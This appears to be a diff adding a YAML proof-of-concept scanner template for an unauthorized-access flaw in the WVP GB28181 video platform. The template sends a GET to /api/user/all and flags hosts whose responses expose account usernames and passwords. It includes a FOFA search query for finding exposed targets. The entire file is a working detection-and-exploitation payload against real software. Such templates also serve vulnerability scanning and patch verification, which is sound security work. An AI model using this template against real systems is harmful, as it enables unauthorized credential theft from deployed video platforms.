@@ -1,0 +1,16 @@
+id: poc-yaml-wvp-gb28181-user-list-info-leak
+info:
+  name: WVP视频平台未授权漏洞，/api/user/all接口可以获取到账号密码
+  severity: high
+  tags:
+  - 信息泄露
+  finger: WVP视频平台
+  fofa: body="国标28181"
+requests:
+- method: GET
+  path: /api/user/all
+  expression: "status_code == 200 && \ncontains(body,\"id\") &&\ncontains(body,\"\\\
+    \"username\\\"\") &&\ncontains(body,\"\\\"password\\\"\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
